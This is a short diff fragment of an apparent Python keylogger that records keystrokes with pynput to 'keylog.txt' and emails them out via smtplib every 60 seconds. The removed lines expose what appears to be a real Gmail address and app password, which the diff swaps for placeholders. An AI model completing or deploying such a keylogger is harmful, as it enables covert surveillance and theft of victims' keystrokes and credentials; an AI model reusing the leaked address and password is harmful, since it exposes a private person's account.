@@ -2,8 +2,8 @@ import smtplib
 import time
 from pynput import keyboard 
 log_file = "keylog.txt"
-email = "pratikshadhage1810@gmail.com"
-password = "jvkh czmf cgoq rjev"
+email = "your_email@gmail.com"
+password = "your password"
 send_interval = 60
 
 def send_email():
